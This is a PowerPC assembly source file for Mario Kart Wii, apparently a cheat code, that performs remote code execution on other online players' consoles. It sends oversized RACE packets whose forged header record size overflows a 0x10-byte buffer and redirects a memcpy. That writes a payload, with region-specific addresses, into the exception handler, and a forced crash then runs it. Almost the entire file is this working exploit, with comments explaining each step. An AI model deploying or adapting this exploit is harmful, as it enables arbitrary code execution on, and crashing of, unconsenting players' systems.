#============================================================#
#            Mario Kart Wii Remote Code Execution            #
#------------------------------------------------------------#
# Author  : Star                                             #
# Date    : Jun 22 2020                                      #
# File    : remote_code_execution.asm                        #
# Version : 1.1.0.2                                          #
#------------------------------------------------------------#
# Description: This code will inject and execute arbitrary   #
# code on a client.                                          #
#------------------------------------------------------------#
# Terms & Conditions: You are fully responsible for all      #
# activity that occurs while using this code. The author of  #
# this code can not be held liable to you or to anyone else  #
# as a result of damages caused by the usage of this code.   #
#============================================================#

#============================================================#
#                    Assembler Directives                    #
#============================================================#

# Constants
.set      HEADER_MAGIC_AND_CRC32_SIZE_BYTE, 8

.set      HEADER_RECORD_SIZES_LENGTH_BYTE, 8
.set      HEADER_RECORD_SIZES_LENGTH_WORD, HEADER_RECORD_SIZES_LENGTH_BYTE / 4

.set      BUFFER_OVERFLOW_PROLOGUE_SIZE_BYTE, 0x18
.set      BUFFER_OVERFLOW_PROLOGUE_SIZE_WORD, BUFFER_OVERFLOW_PROLOGUE_SIZE_BYTE / 4

.set      PAYLOAD_INSTRUCTION_SIZE_BYTE, (label_payload_end - label_payload_start)
.set      PAYLOAD_INSTRUCTION_SIZE_WORD, PAYLOAD_INSTRUCTION_SIZE_BYTE / 4

.set      PACKET_SIZE_BYTE, HEADER_MAGIC_AND_CRC32_SIZE_BYTE + HEADER_RECORD_SIZES_LENGTH_BYTE + BUFFER_OVERFLOW_PROLOGUE_SIZE_BYTE + PAYLOAD_INSTRUCTION_SIZE_BYTE

# Variables
.set      TARGET_CLIENTS_REGION, ''
.set      BOOL_CRASH_CLIENT,

# Asserts
.if       (TARGET_CLIENTS_REGION <> 'E' && TARGET_CLIENTS_REGION <> 'P' && TARGET_CLIENTS_REGION <> 'J' && TARGET_CLIENTS_REGION <> 'K')
          .err
.endif

.if       (BOOL_CRASH_CLIENT <> 0 && BOOL_CRASH_CLIENT <> 1)
          .err
.endif

#============================================================#
#                           Source                           #
#------------------------------------------------------------#
# SendRACEPacket CRC32 Arguments Address:                    #
# RMCE - 0x80653AA8                                          #
# RMCP - 0x80657F30                                          #
# RMCJ - 0x8065759C                                          #
# RMCK - 0x80646248                                          #
#============================================================#

# Increase the packet size
li        r4, PACKET_SIZE_BYTE
stw       r4, 8(r3)

# Load the pointer to the packet (Original instruction)
lwz       r3, 0(r3)

# Skip over the HEADER magic and CRC32 of the packet
addi      r5, r3, 8

#============================================================#
#                       [PAL 806591C8]                       #
#------------------------------------------------------------#
# The first byte of this data overwrites the HEADER record   #
# size in the HEADER record to 0x28. This leads to a buffer  #
# overflow when the target client's game copies 0x28 bytes   #
# of data into a fixed size buffer of 0x10 bytes.            #
#                                                            #
# The buffer overflow overwrites the pointer to the next     #
# record's buffer, to the address specified below. This      #
# address, the payload size, and a pointer to the payload    #
# are all passed as arguments to the next memcpy call.       #
#                                                            #
# The next two bytes are used in conjunction to calculate a  #
# pointer to a null pointer. This null pointer will be       #
# passed as the destination argument to the next memcpy      #
# call. This will cause the game to branch to the exception  #
# handler due to attempting an invalid memory read.          #
#                                                            #
# If you are using this code to write arbitrary values to an #
# arbitrary address, then the rest of the record sizes are   #
# set to zero. This prevents the target client from crashing #
# as their game will not attempt to copy any more data.      #
#============================================================#

bl        branch_link_record_data

# Record sizes
.byte     HEADER_MAGIC_AND_CRC32_SIZE_BYTE + HEADER_RECORD_SIZES_LENGTH_BYTE + BUFFER_OVERFLOW_PROLOGUE_SIZE_BYTE # HEADER
.byte     PAYLOAD_INSTRUCTION_SIZE_BYTE # RACEHEADER_1

.if       (BOOL_CRASH_CLIENT)
          .byte     0x54 # RACEHEADER_2
          .byte     0x01 # SELECT / ROOM
.else
          .byte     0x00 # RACEHEADER2
          .byte     0x00 # SELECT / ROOM
.endif

.byte     0x00 # RACEDATA
.byte     0x00 # USER
.byte     0x00 # ITEM
.byte     0x00 # EVENT

# Padding
.long     0x53746172
.long     0x53746172
.long     0x53746172
.long     0x53746172

#============================================================#
#                       [PAL 80659B7C]                       #
#------------------------------------------------------------#
# This value will be used as the destination to write to     #
# during the memcpy call.                                    #
#============================================================#

.if       (TARGET_CLIENTS_REGION == 'E') # RMCE
          .long 0x80226160
.elseif   (TARGET_CLIENTS_REGION == 'P') # RMCP
          .long 0x802264E4
.elseif   (TARGET_CLIENTS_REGION == 'J') # RMCJ
          .long 0x80226404
.else     # RMCK
          .long 0x80226858
.endif

#============================================================#
#                       [PAL 80659B48]                       #
#------------------------------------------------------------#
# This value will be used as the number of bytes to copy     #
# during the memset call.                                    #
#============================================================#

.long     0x00000000

#============================================================#
#                           Payload                          #
#------------------------------------------------------------#
# The following values are written to the address specified  #
# above during the memcpy call.                              #
#                                                            #
# If you crash the target client, their game will branch to  #
# the exception handler and execute these instructions.      #
#                                                            #
# 21/05/2019                                                 #
# Oh, to answer your ? in the code; yes exception handler    #
# instructions are always accessed uncached with virtual     #
# memory disabled                                            #
#============================================================#

label_payload_start:

.long     0x4800002D
.long     0xFF00FFFF
.long     0xAAD9EEFF
.long     0x52656D6F
.long     0x74652043
.long     0x6F646520
.long     0x45786563
.long     0x7574696F
.long     0x6E206279
.long     0x20537461
.long     0x72000000
.long     0x7C6802A6
.long     0x38830004
.long     0x38A30008
.long     0x3D80801A

.if       (TARGET_CLIENTS_REGION == 'E') # RMCE
          .long 0x618C4E24
.elseif   (TARGET_CLIENTS_REGION == 'P') # RMCP
          .long 0x618C4EC4
.elseif   (TARGET_CLIENTS_REGION == 'J') # RMCJ
          .long 0x618C4DE4
.else     # RMCK
          .long 0x618C5220
.endif

.long     0x7D8803A6
.long     0x4E800020

label_payload_end:

branch_link_record_data:
mflr      r6

li        r7, HEADER_RECORD_SIZES_LENGTH_WORD + BUFFER_OVERFLOW_PROLOGUE_SIZE_WORD + PAYLOAD_INSTRUCTION_SIZE_WORD
mtctr     r7

branch_write_packet_data_loop:
lwz       r7, 0(r6)
stw       r7, 0(r5)

addi      r5, r5, 4
addi      r6, r6, 4

bdnz+     branch_write_packet_data_loop